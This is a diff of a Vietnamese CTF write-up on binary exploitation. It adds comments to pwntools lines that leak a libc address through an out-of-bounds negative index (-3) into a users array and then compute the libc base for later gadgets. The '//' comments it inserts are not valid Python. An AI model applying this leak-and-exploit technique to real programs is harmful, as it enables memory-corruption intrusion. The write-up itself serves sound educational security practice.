@@ -27,8 +27,9 @@ Mảng users nằm ở phân vùng .BSS có quyền `rw-`, nằm chung phân vù
 Đầu tiên leak libc để có được libc.address tính địa chỉ các hàm libc và gadget. Sử dụng hàm `view()` trong chương trình để in ra màn hình dữ liệu nằm trên mảng users. Vì mảng users có kích thước mỗi phần tử là 80 nên leak `__libc_start_main` là khả thi nhất vì từ users đến đó cách 240 BYTES về trước tương ứng với -3*80.
 
     p.sendafter(b'First, create a user.',b'zyan')
-    p.sendlineafter(b'Input your choice:',b'2')
-    p.sendlineafter(b'Input id to view: ',b'-3')
+    
+    p.sendlineafter(b'Input your choice:',b'2')    //view
+    p.sendlineafter(b'Input id to view: ',b'-3')   //index -3
     p.recvuntil(b'Name: ')
     libc_leak=u64(p.recv(6)+b'\x00\x00')
     libc.address=libc_leak-0x29dc0
